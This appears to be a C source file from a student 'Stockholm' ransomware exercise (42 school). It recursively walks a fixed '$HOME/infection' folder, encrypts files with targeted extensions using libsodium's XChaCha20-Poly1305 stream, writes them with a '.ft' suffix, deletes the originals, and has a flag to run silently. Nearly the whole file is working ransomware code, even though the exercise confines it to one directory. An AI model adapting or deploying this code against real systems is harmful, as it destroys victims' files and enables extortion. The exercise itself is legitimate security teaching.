/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   infect.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hoannguy <hoannguy@student.42lausanne.c    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/06/18 23:26:24 by hoannguy          #+#    #+#             */
/*   Updated: 2026/06/28 16:37:26 by hoannguy         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "stockholm.h"

void spread(DIR *dir, char *base_path, bool s_flag, unsigned char *key);
bool encrypt_file(char *source_file, unsigned char *key);
void clean_up(FILE *target, FILE *source, char *target_file);

int infect(char *key, bool s_flag) {
	char	infect_dir[PATH_MAX];
	char	*home;
	DIR		*dir;
	unsigned char	*encrypt_key;

	encrypt_key = load_key(key, s_flag);
	if (!encrypt_key)
		return -1;
	
	home = getenv("HOME");
	if (!home) {
		if (!s_flag)
			fprintf(stderr, "Error: HOME is not set\n");
		free(encrypt_key);
		return -1;
	}
	snprintf(infect_dir, sizeof(infect_dir), "%s/infection", home);

	dir = opendir(infect_dir);
	if (!dir) {
		if (!s_flag)
			fprintf(stderr, "Error: failed to open %s: %s\n", infect_dir, strerror(errno));
		free(encrypt_key);
		return -1;
	}

	spread(dir, infect_dir, s_flag, encrypt_key);
	closedir(dir);
	free(encrypt_key);
	return 0;
}

void spread(DIR *dir, char *base_path, bool s_flag, unsigned char *key) {
	struct dirent	*dp;
	char			path[PATH_MAX];
	DIR				*sub_dir;

	while ((dp = readdir(dir)) != NULL) {
		if (strcmp(dp->d_name, ".") == 0 || strcmp(dp->d_name, "..") == 0)
			continue;
		snprintf(path, sizeof(path), "%s/%s", base_path, dp->d_name);
		if (dp->d_type == DT_DIR) {
			sub_dir = opendir(path);
			if (!sub_dir)
				continue;
			spread(sub_dir, path, s_flag, key);
			closedir(sub_dir);
		} else {
			if (!is_affected_extension(dp->d_name)) {
				if (!s_flag)
					printf("[Skip\t\t] %s\n", path);
				continue;
			}
			if (!encrypt_file(path, key)) {
				if (!s_flag)
					printf("[Fail\t\t] %s\n", path);
				continue;
			}

			if (!s_flag)
				printf("[Encrypted\t] %s\n", path);
		}
	}
}

// https://libsodium.gitbook.io/doc/secret-key_cryptography/secretstream
bool encrypt_file(char *source_file, unsigned char *key) {
	unsigned char	header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
	crypto_secretstream_xchacha20poly1305_state	state;
	FILE	*source;
	char	ext[] = "ft";
	char	target_file[PATH_MAX];
	int		fd;
	FILE	*target;
	unsigned long long	out_len;
	size_t	rlen;
	int		eof;
	unsigned char	tag;
	unsigned char	buf_in[CHUNK_SIZE];
	unsigned char	buf_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];

	source = fopen(source_file, "rb");
	if (source == NULL)
		return false;

	snprintf(target_file, PATH_MAX, "%s.%s", source_file, ext);
	fd = open(target_file, O_WRONLY | O_CREAT | O_TRUNC, 0600);
	if (fd < 0) {
		fclose(source);
		return false;
	}

	target = fdopen(fd, "wb");
	if (target == NULL) {
		fclose(source);
		close(fd);
		return false;
	}

	crypto_secretstream_xchacha20poly1305_init_push(&state, header, key);

	if (!fwrite(header, 1, sizeof header, target)) {
		clean_up(target, source, target_file);
		return false;
	}
	do {
		// read from source
		rlen = fread(buf_in, 1, sizeof buf_in, source);
		// check if eof
		eof = feof(source);
		if (!eof && ferror(source)) {
			clean_up(target, source, target_file);
			return false;
		}
		// if eof then need TAG FINAL
		tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
		crypto_secretstream_xchacha20poly1305_push(&state, buf_out, &out_len, buf_in, rlen,
												NULL, 0, tag);
		if (!fwrite(buf_out, 1, (size_t) out_len, target)) {
			clean_up(target, source, target_file);
			return false;
		}
	} while (!eof);
	fclose(target);
	fclose(source);
	remove(source_file);
	return true;
}

